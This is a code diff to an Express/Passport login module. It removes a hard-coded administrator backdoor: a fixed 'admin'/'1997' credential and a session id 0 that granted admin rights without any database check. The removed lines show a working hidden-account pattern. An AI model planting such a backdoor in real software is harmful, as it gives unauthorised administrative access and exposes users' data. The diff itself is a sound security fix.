@@ -56,17 +56,6 @@ export function setupAuth(app: Express) {
   passport.use(
     new LocalStrategy(async (username, password, done) => {
       try {
-        if (username === 'admin' && password === '1997') {
-          return done(null, {
-            id: 0,
-            username: 'admin',
-            isAdmin: true,
-            password: '',
-            email: 'admin@goated.com',
-            createdAt: new Date(),
-          });
-        }
-
         const [user] = await db
           .select()
           .from(users)
@@ -93,17 +82,6 @@ export function setupAuth(app: Express) {
 
   passport.deserializeUser(async (id: number, done) => {
     try {
-      if (id === 0) {
-        return done(null, {
-          id: 0,
-          username: 'admin',
-          isAdmin: true,
-          password: '',
-          email: 'admin@goated.com',
-          createdAt: new Date(),
-        });
-      }
-
       const [user] = await db
         .select()
         .from(users)
@@ -115,7 +93,6 @@ export function setupAuth(app: Express) {
     }
   });
 
-  // Authentication routes
   app.post("/api/register", async (req, res, next) => {
     try {
       const result = insertUserSchema.safeParse(req.body);
